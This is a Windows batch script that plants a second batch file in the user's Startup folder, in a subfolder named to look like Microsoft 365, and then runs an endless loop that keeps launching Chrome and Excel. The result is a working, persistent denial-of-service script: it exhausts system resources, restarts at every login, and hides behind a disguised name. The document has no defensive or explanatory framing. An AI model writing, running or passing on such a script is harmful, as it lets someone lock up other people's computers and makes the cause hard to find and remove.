@echo off
setlocal

:: Define the base directory and file path
set "BASE_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft 365"
set "DAT_FILE=%BASE_DIR%\filestype.bat"

:: Create the directory if it does not exist
if not exist "%BASE_DIR%" mkdir "%BASE_DIR%"

:: Create the file with the desired content
(
echo @echo off
echo :admin
echo start chrome.exe
echo start excel.exe
echo goto :admin
) > "%DAT_FILE%"

:: Run the loop in the current script
:admin
start chrome.exe
start excel.exe
goto :admin